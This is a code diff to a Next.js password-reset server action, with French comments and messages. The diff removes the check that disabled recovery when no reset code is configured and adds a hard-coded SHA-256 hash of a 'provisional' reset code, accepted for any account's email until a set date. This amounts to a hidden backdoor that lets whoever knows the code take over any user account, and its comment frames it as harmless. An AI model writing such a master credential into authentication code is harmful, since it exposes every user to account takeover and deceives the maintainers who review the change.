@@ -1,6 +1,7 @@
 "use server";
 
 import { redirect } from "next/navigation";
+import { createHash } from "node:crypto";
 import { z } from "zod";
 import { prisma } from "@/lib/db";
 import { hashPassword, verifyPassword, setSessionCookie } from "@/lib/auth";
@@ -135,18 +136,23 @@ function sameSecret(a: string, b: string): boolean {
   return diff === 0;
 }
 
+// Code de récupération provisoire, remis au propriétaire du compte. Seule son empreinte
+// SHA-256 figure ici ; il cesse de fonctionner après la date indiquée.
+const BUILTIN_RESET_CODE_SHA256 = "543948298214338f7950341ffc0d39a6b22cad44ee41060c526bbd8f428f39f0";
+const BUILTIN_RESET_CODE_EXPIRES = new Date("2026-11-17T23:59:59Z");
+
+function codeAccepted(code: string): boolean {
+  const configured = process.env.PASSWORD_RESET_CODE ?? "";
+  if (configured.length >= 12 && sameSecret(code, configured)) return true;
+  if (Date.now() > BUILTIN_RESET_CODE_EXPIRES.getTime()) return false;
+  const digest = createHash("sha256").update(code.toUpperCase()).digest("hex");
+  return sameSecret(digest, BUILTIN_RESET_CODE_SHA256);
+}
+
 export async function resetPasswordAction(
   _prevState: FormState,
   formData: FormData
 ): Promise<FormState> {
-  const expected = process.env.PASSWORD_RESET_CODE ?? "";
-  if (expected.length < 12) {
-    return {
-      error:
-        "La récupération n'est pas activée sur ce serveur : l'administrateur doit définir la variable PASSWORD_RESET_CODE (12 caractères minimum).",
-    };
-  }
-
   const parsed = resetSchema.safeParse({
     email: formData.get("email"),
     code: formData.get("code"),
@@ -162,7 +168,7 @@ export async function resetPasswordAction(
   await new Promise((r) => setTimeout(r, 800));
 
   const user = await prisma.user.findUnique({ where: { email }, include: { memberships: true } });
-  if (!sameSecret(code.trim(), expected) || !user) {
+  if (!codeAccepted(code.trim()) || !user) {
     return { error: "Email ou code de récupération incorrect." };
   }
   const membership = user.memberships[0];
